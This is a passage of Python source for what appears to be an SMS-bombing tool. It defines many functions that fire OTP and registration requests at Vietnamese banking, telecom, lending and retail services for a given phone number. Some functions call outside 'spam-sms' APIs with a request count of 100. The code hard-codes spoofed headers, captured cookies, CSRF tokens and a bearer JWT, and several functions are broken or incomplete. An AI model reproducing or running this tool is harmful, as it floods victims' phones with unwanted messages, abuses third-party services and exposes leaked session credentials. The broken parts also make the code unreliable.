    'cookie': 'fbp=fb.1.1681635921620.1153873944;zi=2000.SSZzejyD6zyjZAYrmnPo2t9yFR9GbVGRvNYDTG5S9vX-sYtrDTZ7k4wA7VKrJ1UeBfxDjNLSLyXkJfCm.1;XSRF-TOKEN=eyJpdiI6ImlmZ2dwR3E3cmN6c0swa1lna0NOTXc9PSIsInZhbHVlIjoidG5NWWxOS1FxZTU0ZVFxekN4SmI1Z0VmVXQ5T2gwK1kxXC9HQTV6VFJDRVZ1U0haXC8yMldIYTdySERMS250aHdQIiwibWFjIjoiZGRlOTdhMjU5NGYyZGJkZDMzMmQxMTY2NDhkNDM2YjQ4M2JhMjI1YWRmYWYzZWViNDQ3ZmVlM2Y2NzNkMWM5MCJ9;laravelsession=eyJpdiI6IkJNSWdvektYKzJWMnZ1SGRzeTJpSVE9PSIsInZhbHVlIjoiYUY4dnlUbzI3bWhxK0Y5VkRIbXVwaWN3V3RLYmpZV04zemxib2krTEhRZTVPUlpraG40eE9Oa3Q5Q1wvMExrYmciLCJtYWMiOiJjNTNkMTNlMzIwZGIzNGZmNTY5MDQ5OGEzNTkzZGQ5MTlhMGE2NmVmMzM1ZTlkNzA3ZjRlMWFlNWQwNDg0Y2Y3In0%3D'
  }
  get = CURL("GET", "https://nhadat.cafeland.vn/dang-ky.html", None, head, False)
  token = get.split('name="token" value="')[1].split('"')[0]
  data = "mobile="+sdt+"&token="+token
  get = json.loads(CURL("POST", "https://nhadat.cafeland.vn/member-send-otp/", data, head, False))

def DAIHOCFPT(sdt):
  head = {
    "Host": "daihoc.fpt.edu.vn",
    "accept": "/",
    "x-requested-with": "XMLHttpRequest",
    "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
    "origin": "https://daihoc.fpt.edu.vn",
    "referer": "https://daihoc.fpt.edu.vn/tuyen-sinh-dh-fpt/"
  }
  data = "firstname=Khang&mobilephone="+sdt+"&email=tenhkhong3%40gmail.com&cityid=B%C3%ACnh+Ph%C6%B0%E1%BB%9Bc&ldpid=tuyen-sinh-dh-fpt&utmsource=&utmmedium=&utmcampaign=&utmterm=&urlreferer=&utmcpname=&utmadscampaign=&scripturi=https%3A%2F%2Fdaihoc.fpt.edu.vn%2Ftuyen-sinh-dh-fpt%2F&typeregister="
  get = CURL("POST", "https://daihoc.fpt.edu.vn/tstt/tuyen-sinh-dh-fpt/register.php", data, head, false)
  get = CURL("GET", "https://daihoc.fpt.edu.vn/user/login/gui-lai-otp.php?mobile="+sdt+"&resendopt=1", None, head, False)                           
  
def ONCREDIT(sdt):
    headers = {
        "Host": "oncredit.vn",
        "accept": "application/json, text/javascript, */*; q=0.01",
        "x-requested-with": "XMLHttpRequest",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "origin": "https://oncredit.vn",
        "referer": "https://oncredit.vn/registration",
        "cookie": "SN5c8116d5e6183=3tv1o7ton9n12jtnug96f8d8ut;OnCredit_id=643e0edf695496.07498174;fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef=TGp96BSUW5IwMh0JgHeUd49rmhRq1triMmGzLzWzvCI=;GN_USER_ID_KEY=66bb4878-093a-4dfc-9f25-3ee94accd97a;GN_SESSION_ID_KEY=fd64cde4-6459-4ff0-8a68-7770bd9aa247",
    }

    session = requests.Session()
    session.get("https://oncredit.vn/registration", headers=headers)
    token = session.cookies.get("CSRFToken")

    data = {
        "data[typeData]": "sendCodeReg",
        "data[phone]": sdt,
        "data[email]": "khangksjjrf@gmail.com",
        "data[captcha1]": 1,
        "data[lang]": "vi",
        "CSRFName": "CSRFGuard_ajax",
        "CSRFToken": token,
    }
    response = session.post("https://oncredit.vn/?ajax", data=data, headers=headers)
    result = response.json()  
                                                       
def FINDO(sdt):
    headers = {
        "Host": "api.findo.vn",
        "accept": "application/json, text/plain, */*",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
        "content-type": "application/json;charset=UTF-8",
        "origin": "https://www.findo.vn",
        "referer": "https://www.findo.vn/",
    }

    data = {"mobilePhone": {"number": sdt}}
    response = requests.post("https://api.findo.vn/web/public/client/phone/sms-code-ts", json=data, headers=headers)
    result = response.json()
  
def MONEYVEO(sdt):
    def generateRandomString(length):
        letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
        return ''.join(random.choice(letters) for i in range(length))
    headers = {
        "Host": "moneyveo.vn",
        "accept": "/",
        "x-requested-with": "XMLHttpRequest",
        "traceparent": "00-" + generateRandomString(len("c771ff34b940c30df615b678478fce28")) + "-" + generateRandomString(len("1e0ba42c6725b148")) + "-00",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "referer": "https://moneyveo.vn/vi/registernew/",
    }
    
    headers = {
        "Host": "moneyveo.vn",
        "accept": "/",
        "x-requested-with": "XMLHttpRequest",
        "traceparent": "00-" + generateRandomString(len("c771ff34b940c30df615b678478fce28")) + "-" + generateRandomString(len("1e0ba42c6725b148")) + "-00",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "referer": "https://moneyveo.vn/vi/registernew/",
        "cookie": ck,
    }
    
    response = requests.post("https://moneyveo.vn/vi/registernew/sendsmsjson/", data=data, headers=headers)
    access = json.loads(response.text)

def VAYVND(sdt):
    head = [
        "Host: api.vayvnd.vn",
        "accept: application/json",
        "accept-language: vi",
        "user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
        "content-type: application/json",
        "origin: https://vayvnd.vn",
        "referer: https://vayvnd.vn/",
    ]
    data = '''
    {
        "phone": "'''+sdt+'''",
        "utm_campaign": "null",
        "cpa_id": 7,
        "cpa_lead_data": {
            "click_id": "'''+generateImei()+'''",
            "source_id": "source_6",
            "utm_score": "0.0'''+generateRandomstr(len("13672266155481339"))+'''"
        },
        "utm_list": [
            {
            "utm_source": "jeffapp"
            }
        ],
        "source_site": 1,
        "reg_screen_resolution": {
            "width": 412,
            "height": 915
        }
    }'''
    GET = json(CURL("POST", "https://api.vayvnd.vn/v1/users", data, head, False))
    if GET["data"]["id"]:
        return {"VAYVND": "Thành Công"}
    else:
        data = '''
        {
            "login": "'''+sdt+'''"
        }'''
        GET = json(CURL("POST", "https://api.vayvnd.vn/v1/users/password-reset", data, head, False))

def LOSHIP(sdt):
    a = "84" + sdt
    usersdt = a.split("840")[1]
    head = {
        "Host": "latte.lozi.vn",
        "accept-language": "vi_VN",
        "x-access-token": "unknown",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
        "content-type": "application/json",
        "accept": "*/*",
        "origin": "https://loship.vn",
        "referer": "https://loship.vn/",
    }
    data = '{"device":"Android 12","platform":"Chrome WebView/96.0.4664.104","countryCode":"84","phoneNumber":"' + sdt + '"}'
    response = requests.post("https://latte.lozi.vn/v1.2/auth/register/phone/initial", data=data, headers=head)

def TUOITRE(sdt):
    url = "https://tuoitre.vn"  # Replace with the correct URL
    headers = {
        "Host": "tuoitre.vn",
        "accept": "application/json, text/plain, */*",
        "x-requested-with": "XMLHttpRequest",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
        "content-type": "multipart/form-data; boundary=----WebKitFormBoundary6tasV7gdCXo1XomC",
        "origin": "https://sso.tuoitre.vn",
        "cookie": "_ttsid=2585aa59f50b946ccae21ac9ec87353395a8893412ea53150a8e6dc0d1c15841;XSRF-TOKEN=eyJpdiI6IldLQ3J0bkp6bVJUWk4yajBkd1RQZkE9PSIsInZhbHVlIjoiclUwb25DWW5YNmFmbXpqMDJZVjBpcHVGZVdOdmdQeG9sZ0tUd3dMUjc4L3RWNkd3NGdaNzMvVFRMTlQwcm5kZ3B6TGZYS3R4SlNvQVlXcksyR3JISUl0R3VwYzZCOFY5Q242akFmL1hSTXhpTEx1OWpQeXlTY01jOFR1bzlES08iLCJtYWMiOiJlMTNjMDk2MWRhMDZlNDJjMjAyZTg2MWI1N2Y0NzljNDQ3MGM0YjQ2ZTEzMGVkMzFiNjBhNjZiNWU2MjIwYjc5IiwidGFnIjoiIn0%3D;SSO_SID=eyJpdiI6ImFHK0NycmxqYVRPV0lDUXZYTSttdkE9PSIsInZhbHVlIjoiTm5TMDNJVlVMdGxYelBWNWlzSFNselh"
        
    }         
    
def DONGPLUS(sdt):
    sdt = "84" + sdt
    sdt = sdt.split("840")[1]    
    head = [
        "Host: api.dongplus.vn",
        "accept-language: vi",
        "user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
        "content-type: application/json",
        "accept: */*",
        "origin: https://dongplus.vn",
        "referer: https://dongplusvn/user/login"
    ]
    
    data = '{"full_name":"Khang Nguyễn","first_name":"Nguyễn","last_name":"Khang","mobile_phone":"84' + sdt + '","target_url":"https://dongplus.vn/?utm_source=direct&utm_medium=direct&utm_campaign=direct"}'
    
    CURL("POST", "https://api.dongplus.vn/api/user", data, head, False)
    
    data = '{"phone":"84' + sdt + '"}'
    
    access = CURL("POST", "https://api.dongplus.vn/api/user/send-one-time-password", data, head, False)

def F88(sdt):
    headers = {
        "Host": "api.f88.vn",
        "accept": "application/json, text/plain, */*",
        "content-encoding": "gzip",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; Pixel 3 Build/SP1A.210812.016.C1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.136 Mobile Safari/537.36",
        "content-type": "application/json",
        "origin": "https://online.f88.vn",
        "referer": "https://online.f88.vn/",
    }
    data = {
        "phoneNumber": sdt,
        "recaptchaResponse": "03AFY_a8WJNsx5MK3zLtXhUWB0Jlnw7pcWRzw8R3OhpEx5hu3Shb7ZMIfYg0H2X24378jj2NFtndyzGFF_xjjZ6bbq3obns9JlajYsIz3c1SESCbo05CtzmP_qgawAgOh495zOgNV2LKr0ivV_tnRpikGKZoMlcR5_3bks0HJ4X_R6KgdcpYYFG8cUZRSxSamyRPkC2yjoFNpTeCJ2Q6-0uDTSEBjYU5T3kj8oM8rAAR6BnBVVD7GMz0Ol2OjsmmXO4PtOwR8yipYdwBnL2p8rC8cwbPJ-Q6P1mTmzHkxZwZWcKovlpEGUvt2LfByYwXDMmx7aoI6QMTitY64dDVDdQSWQfyXC1jFg200o5TBFnTY0_0Yik31Y33zCM_r24HQ56KRMuew2LazF8u_30vyWN1tigdvPddOOPjWGjh2cl87l2cF57lCvoRTtOm-RRxyy5l0eq4dgsu2oy1khwawzzP5aE9c2rgcdDVMojZOUpamqhbKtsExad31Brilwf7BSVvu-JT33HtHO",
        "source": "Online"
    }
    response = requests.post("https://api.f88.vn/growth/appvay/api/onlinelending/VerifyOTP/sendOTP", json=data, headers=headers)


def TIENOI(sdt):
    headers = {
        "Host": "app.tienoi.com.vn",
        "accept": "application/json, text/plain, */*",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
        "content-type": "application/json",
        "origin": "https://app.tienoi.com.vn",
        "referer": "https://app.tienoi.com.vn/auth/registration?need=2000000&days=14",
    }
    data = {
        "mobilePhone": sdt,
        "password": "A123456789a",
        "passwordConfirmation": "A123456789a",
        "isVoiceSms": True
    }
    response = requests.post("https://app.tienoi.com.vn/portal/api/v1/public/signUp/sendAcceptanceCode", json=data, headers=headers)

def VIETTELL(sdt):
    head = {
        "Host": "vietteltelecom.vn",
        "Connection": "keep-alive",
        "X-CSRF-TOKEN": "mXy4RvYExDOIR62HlNUuGjVUhnpKgMA57LhtHQ5I",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; RMX3063) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36",
        "Content-Type": "application/json;charset=UTF-8",
        "Accept": "application/json, text/plain, /",
        "Referer": "https://vietteltelecom.vn/dang-nhap",
    }
    data = {
        "phone": sdt,
        "type": ""
    }
    GET = json(CURL("POST", "https://vietteltelecom.vn/api/get-otp-login", json.dumps(data), head, False))

def META(sdt):
    head = {
        "Host": "meta.vn",
        "accept": "application/json, text/plain, /",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
        "content-type": "application/json",
        "origin": "https://meta.vn",
        "referer": "https://meta.vn/account/register",
        "cookie": "ssid=smfszyszu3tq5h02lmly12yz;cart=fc5bf0de-45de-4323-a007-f7860e71a5a1;ckmid=262a67477e774f56b3de7e656e741682"
    }
    data = '{"apiargs":{"lgUser":"' + sdt + '","act":"send","type":"phone"},"apimethod":"CheckExist"}'
    GET = json(CURL("POST", "https://meta.vn/appscripts/pages/AccountReact.aspx?apimode=1", data, head, False))

def TAMO(sdt):
    head = {
        "Host": "api.tamo.vn",
        "accept": "application/json, text/plain, /",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
        "content-type": "application/json;charset=UTF-8",
        "origin": "https://www.tamo.vn",
        "referer": "https://www.tamo.vn/",
    }
    data = '{"mobilePhone":{"number":"' + sdt + '"}}'
    access = json(CURL("POST", "https://api.tamo.vn/web/public/client/phone/sms-code-ts", data, head, False))

def MOMO(sdt):
     head = [
         "agentid: undefined",
         "sessionkey:",
         "userphone: undefined",
         "authorization: Bearer undefined",
         "msgtype: CHECKUSERBEMSG",
         "Host: api.momo.vn",
         "User-Agent: okhttp/4.0.12",
         "appversion: 40122",
         "appcode: 4.0.12",
         "deviceos: ANDROID"
     ]
     data = {
         'user': sdt,
         'msgType': 'CHECKUSERBEMSG',
         'cmdId': str(microtime) + '000000',
         'lang': 'vi',
         'time': microtime,
         'channel': 'APP',
         'appVer': '40122',
         'appCode': '4.0.12',
         'deviceOS': 'ANDROID',
         'buildNumber': 0,
         'appId': 'vn.momo.platform',
         'result': True,
         'errorCode': 0,
         'errorDesc': '',
         'momoMsg': 
         {
             'class': 'mservice.backend.entity.msg.RegDeviceMsg',
             'number': sdt,
             'imei': imei,
             'cname': 'Vietnam',
             'ccode': '084',
             'device': "Oppo realme X Lite",
             'firmware': '23',
             'hardware': "RMX1851CN",
             'manufacture': "Oppo",
             'csp': '',
             'icc': '',
             'mcc': '452',
             'deviceos': 'Android',
             'secureid': sec,
         },
         'extra': {
             'checkSum': '',
         },
     }
     GET = json(CURL("POST", "https://api.momo.vn/backend/otp-app/public/", json.dumps(data), head, False))

def apiv3(phone):
    cookies = {
        '_ga': 'GA1.1.355569834.1685331326',
        '_hp2_ses_props.758475466': '%7B%22ts%22%3A1685616159432%2C%22d%22%3A%22onlytrislua.x10.mx%22%2C%22h%22%3A%22%2F%22%7D',
        '_hp2_id.758475466': '%7B%22userId%22%3A%222150082854199568%22%2C%22pageviewId%22%3A%225407290981034883%22%2C%22sessionId%22%3A%22627390060443876%22%2C%22identity%22%3Anull%2C%22trackerVersion%22%3A%224.0%22%7D',
        '_ga_LKETQQ110J': 'GS1.1.1685616159.3.1.1685616694.0.0.0',
        'serverChoice': 'Server-IPv2',
    }

    headers = {
        'authority': 'onlytrislua.x10.mx',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': '_ga=GA1.1.355569834.1685331326; _hp2_ses_props.758475466=%7B%22ts%22%3A1685616159432%2C%22d%22%3A%22onlytrislua.x10.mx%22%2C%22h%22%3A%22%2F%22%7D; _hp2_id.758475466=%7B%22userId%22%3A%222150082854199568%22%2C%22pageviewId%22%3A%225407290981034883%22%2C%22sessionId%22%3A%22627390060443876%22%2C%22identity%22%3Anull%2C%22trackerVersion%22%3A%224.0%22%7D; _ga_LKETQQ110J=GS1.1.1685616159.3.1.1685616694.0.0.0; serverChoice=Server-IPv2',
        'origin': 'https://onlytrislua.x10.mx',
        'referer': 'https://onlytrislua.x10.mx/download/user-vip-spam-sms.php',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
    }

    data = {
        'phone': phone,
        'ten_server': 'Server-IPv2',
        'key': 'TRTS',
    }

    requests.post('https://onlytrislua.x10.mx/download/user-vip-spam-sms.php', cookies=cookies, headers=headers, data=data)

def apiv2(phone):
    cookies = {
        '_ga': 'GA1.1.355569834.1685331326',
        '_hp2_id.758475466': '%7B%22userId%22%3A%222150082854199568%22%2C%22pageviewId%22%3A%228770872279147596%22%2C%22sessionId%22%3A%227025862886191853%22%2C%22identity%22%3Anull%2C%22trackerVersion%22%3A%224.0%22%7D',
        '_ga_LKETQQ110J': 'GS1.1.1685331326.1.1.1685331343.0.0.0',
    }

    headers = {
        'authority': 'onlytrislua.x10.mx',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': '_ga=GA1.1.355569834.1685331326; _hp2_id.758475466=%7B%22userId%22%3A%222150082854199568%22%2C%22pageviewId%22%3A%228770872279147596%22%2C%22sessionId%22%3A%227025862886191853%22%2C%22identity%22%3Anull%2C%22trackerVersion%22%3A%224.0%22%7D; _ga_LKETQQ110J=GS1.1.1685331326.1.1.1685331343.0.0.0',
        'origin': 'https://onlytrislua.x10.mx',
        'referer': 'https://onlytrislua.x10.mx/s/user-spam-sms.php',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
    }

    data = {
        'phone': phone,
        'server_id': '493',
        'key': 'TRTS',
    }

    response = requests.post('https://onlytrislua.x10.mx/s/user-spam-sms.php', cookies=cookies, headers=headers, data=data)

def tgdd(phone):
    cookies = {
        'DMX_Personal': '%7B%22UID%22%3A%2202a2125eae4752c091831644559197e73c7d03c7%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D',
        '.AspNetCore.Antiforgery.UMd7_MFqVbs': 'CfDJ8OWsBjKS6DlGsrtmU_sYztKa6jv4_yE6DtGOKVnXzsN6QtnTcJHOshhJAjy60o2M8G7nlhVDVpVJq5TrlHeeRcwJjejgiIZpN-iBvlNqnf1tRwxng2G6uuWHF9XpCpNPf5yKVSW_11B4iUgzW4n4SgE',
        '_gid': 'GA1.2.2106570071.1685151972',
        '_ga_TLRZMSX5ME': 'GS1.1.1685151972.1.0.1685151972.60.0.0',
        '_ga': 'GA1.1.2004811826.1685151972',
        '_fbp': 'fb.1.1685151972814.1550382232',
        'cebs': '1',
        '_ce.s': 'v~23af4964fee97034df50d8ac200f8c95b4ea3899~lcw~1685151972938~vpv~0~lcw~1685151972940',
        '_ce.clock_event': '1',
        'SvID': 'beline2686|ZHFg6|ZHFg5',
        '_ce.clock_data': '-113%2C14.225.211.123%2C1',
        'cebsp_': '1',
        '_tt_enable_cookie': '1',
        '_ttp': '5MoF_IoMgcKATLRi4lIvjOVPQrd',
        'lhc_per': 'vid|eadd7b088636140f774e',
    }

    headers = {
        'authority': 'www.thegioididong.com',
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'DMX_Personal=%7B%22UID%22%3A%2202a2125eae4752c091831644559197e73c7d03c7%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D; .AspNetCore.Antiforgery.UMd7_MFqVbs=CfDJ8OWsBjKS6DlGsrtmU_sYztKa6jv4_yE6DtGOKVnXzsN6QtnTcJHOshhJAjy60o2M8G7nlhVDVpVJq5TrlHeeRcwJjejgiIZpN-iBvlNqnf1tRwxng2G6uuWHF9XpCpNPf5yKVSW_11B4iUgzW4n4SgE; _gid=GA1.2.2106570071.1685151972; _ga_TLRZMSX5ME=GS1.1.1685151972.1.0.1685151972.60.0.0; _ga=GA1.1.2004811826.1685151972; _fbp=fb.1.1685151972814.1550382232; cebs=1; _ce.s=v~23af4964fee97034df50d8ac200f8c95b4ea3899~lcw~1685151972938~vpv~0~lcw~1685151972940; _ce.clock_event=1; SvID=beline2686|ZHFg6|ZHFg5; _ce.clock_data=-113%2C14.225.211.123%2C1; cebsp_=1; _tt_enable_cookie=1; _ttp=5MoF_IoMgcKATLRi4lIvjOVPQrd; lhc_per=vid|eadd7b088636140f774e',
        'origin': 'https://www.thegioididong.com',
        'referer': 'https://www.thegioididong.com/lich-su-mua-hang/dang-nhap',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phoneNumber': phone,
        'isReSend': 'false',
        'sendOTPType': '1',
        '__RequestVerificationToken': 'CfDJ8OWsBjKS6DlGsrtmU_sYztIFV_sLQ8iWp7L2ZHjo3-UAquJc6mF7IflJ21rflzBVCTfkVYuNcBYuDIdaZroeLkecOCkjg8RcsK0QvNDv6_w7iP7JTCGaGgWZ4Ybwep7Zt6N6vP8-qJcVUHhSPvjvh_s',
    }

    response = requests.post(
        'https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
        cookies=cookies,
        headers=headers,
        data=data,
    )
  
def apiv5(phone):
    url = "https://api.huykaiser.me/API/AUTOSPAM/spam?count=100&phone={}".format(phone)
    requests.post(url)

def tiki(phone):
    response_tiki = requests.post('https://tiki.vn/api/v2/customers/otp_codes', headers=ua, json=jsdt).text
###
def moca(phone):
    home = requests.get('https://moca.vn/moca/v2/users/role', params=paramss, headers=headerss).json()
    token = home['data']['registrationId']
    response = requests.post(f'https://moca.vn/moca/v2/users/registrations/{token}/verification', headers=headerss).json()
def gbay(phone):
    json_data = {'phone_number': phone,'hash': random_string(40),}
    requests.post('https://api-wallet.g-pay.vn/internal/api/v3/users/send-otp-reg-phone', json=json_data).json()

def vieon1(phone):
    Headers = {"Host": "api.vieon.vn","content-length": "201","accept": "application/json, text/plain, */*","content-type": "application/x-www-form-urlencoded","sec-ch-ua-mobile": "?1","authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2ODE5MTU2NjYsImp0aSI6ImY1ZGI4MDJmNTZjMjY2OTg0OWYxMjY0YTY5NjkyMzU5IiwiYXVkIjoiIiwiaWF0IjoxNjc5MzIzNjY2LCJpc3MiOiJWaWVPbiIsIm5iZiI6MTY3OTMyMzY2NSwic3ViIjoiYW5vbnltb3VzXzdjNzc1Y2QxY2Q0OWEzMWMzODkzY2ExZTA5YWJiZGUzLTdhMTIwZTlmYWMyNWQ4NTQ1YTNjMGFlM2M0NjU3MjQzLTE2NzkzMjM2NjYiLCJzY29wZSI6ImNtOnJlYWQgY2FzOnJlYWQgY2FzOndyaXRlIGJpbGxpbmc6cmVhZCIsImRpIjoiN2M3NzVjZDFjZDQ5YTMxYzM4OTNjYTFlMDlhYmJkZTMtN2ExMjBlOWZhYzI1ZDg1NDVhM2MwYWUzYzQ2NTcyNDMtMTY3OTMyMzY2NiIsInVhIjoiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBSTVgxOTE5KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTEwLjAuMC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM2IiwiZHQiOiJtb2JpbGVfd2ViIiwibXRoIjoiYW5vbnltb3VzX2xvZ2luIiwibWQiOiJBbmRyb2lkIDEwIiwiaXNwcmUiOjAsInZlcnNpb24iOiIifQ.aQj5VdubC7B-CLdMdE-C9OjQ1RBCW-VuD38jqwd7re4","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","sec-ch-ua-platform": "\"Android\"","origin": "https://vieon.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://vieon.vn/?utm_source\u003dgoogle\u0026utm_medium\u003dcpc\u0026utm_campaign\u003dapproi_VieON_SEM_Brand_BOS_Exact_VieON_ALL_1865B_T_Mainsite\u0026utm_content\u003dp_--k_vieon\u0026pid\u003dapproi\u0026c\u003dapproi_VieON_SEM_Brand_BOS_Exact\u0026af_adset\u003dapproi_VieON_SEM_Brand_BOS_Exact_VieON_ALL_1865B\u0026af_force_deeplink\u003dfalse\u0026gclid\u003dCjwKCAjwiOCgBhAgEiwAjv5whOoqP2b0cxKwybwLcnQBEhKPIfEXltJPFHHPoyZgaTWXkY-SS4pBqRoCS2IQAvD_BwE","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"}
    Params = {"platform": "mobile_web","ui": "012021"}
    Payload = {"phone_number": phone,"password": "Vexx007","given_name": "","device_id": "7c775cd1cd49a31c3893ca1e09abbde3","platform": "mobile_web","model": "Android%2010","push_token": "","device_name": "Chrome%2F110","device_type": "desktop","ui": "012021"}
    response = requests.post("https://api.vieon.vn/backend/user/register/mobile", params=Params, data=Payload, headers=Headers)

def ahamove(phone):
    mail = random_string(6)
